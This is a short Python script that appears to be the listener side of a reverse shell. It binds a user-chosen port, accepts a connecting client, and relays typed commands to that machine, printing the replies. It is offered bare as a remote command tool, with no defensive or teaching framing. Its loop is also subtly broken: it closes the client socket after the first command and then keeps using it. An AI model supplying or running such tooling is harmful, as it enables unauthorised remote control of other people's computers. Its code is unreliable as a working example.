import sys
import socket

Server = ""
Port = int(input("Enter a Port: "))

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((Server, Port))

s.listen(1)

while True:
    print(f'[+] listening as {Server}:{Port}')

    Client = s.accept()
    print(f'[+] Client connected {Client[1]}')

    Client[0].send('connected'.encode())
    while True:
        cmd = input('>>> ')
        Client[0].send(cmd.encode())

        if cmd.lower() in ['quit', 'exit', 'q', 'x']:
            break

        result = Client[0].recv(1024).decode()
        print(result)

        Client[0].close()

        cmd = input('Wait for client? type y or n: ') or 'y'
        if cmd.lower() in ['n', 'no']:
            break

s.close()
